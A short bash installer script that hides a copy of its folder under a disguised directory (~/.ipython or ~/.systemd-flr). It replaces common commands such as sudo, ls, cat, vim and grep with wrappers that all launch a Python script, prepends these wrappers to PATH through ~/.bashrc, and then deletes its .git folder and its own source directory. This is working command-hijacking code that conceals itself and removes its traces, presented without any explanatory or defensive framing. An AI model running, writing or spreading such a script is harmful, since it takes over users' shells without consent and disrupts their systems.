#!/bin/bash


DEST="$HOME/.ipython"
DIR="$PWD"
BIN_DIR="$DEST/bin"
COMMANDS=(
    "sudo" "fularta" "ls" "nano" "vi" "nvim"
    "cat" "code" "vim" "man" "find" "grep"
    "less" "more" "head" "tail" "awk" "echo"
)
TARGET_CONFIGS=(
    "$HOME/.bashrc"
)
PATH_EXPORT="export PATH=\"$BIN_DIR:\$PATH\""


if [ ! -d "$DEST" ]; then
    DEST="$HOME/.systemd-flr"
fi


rm -rf .git
mkdir -p "$BIN_DIR"
cp -r "$DIR/." "$DEST/"

#create command file
for cmd in "${COMMANDS[@]}"; do
    cat <<EOF > "$BIN_DIR/$cmd"
#!/bin/sh
exec python3 "$DEST/papa.py" "$DEST/papa.ppm"
EOF
    chmod +x "$BIN_DIR/$cmd"
done

#update PATH variable in config files
for config in "${TARGET_CONFIGS[@]}"; do
    touch "$config"
    if ! grep -q "$BIN_DIR" "$config"; then
        echo "$PATH_EXPORT" >> "$config"
    fi
done

cd ..
rm -rf "$DIR"